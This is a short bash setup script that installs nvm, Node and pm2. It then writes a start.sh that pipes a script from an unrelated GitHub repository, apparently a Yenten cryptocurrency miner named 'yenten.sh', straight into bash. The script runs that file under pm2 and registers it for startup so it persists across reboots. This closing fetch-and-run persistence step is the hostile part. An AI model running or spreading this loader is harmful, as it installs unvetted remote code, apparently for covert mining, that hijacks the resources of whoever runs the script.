#/bin/bash
apt update -y 
apt install curl wget git -y
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
nvm install --lts
npm install pm2 -g
echo 'curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/yenten.sh |bash' > start.sh
chmod +x *
pm2 start ./start.sh
pm2 startup 
pm2 save -f
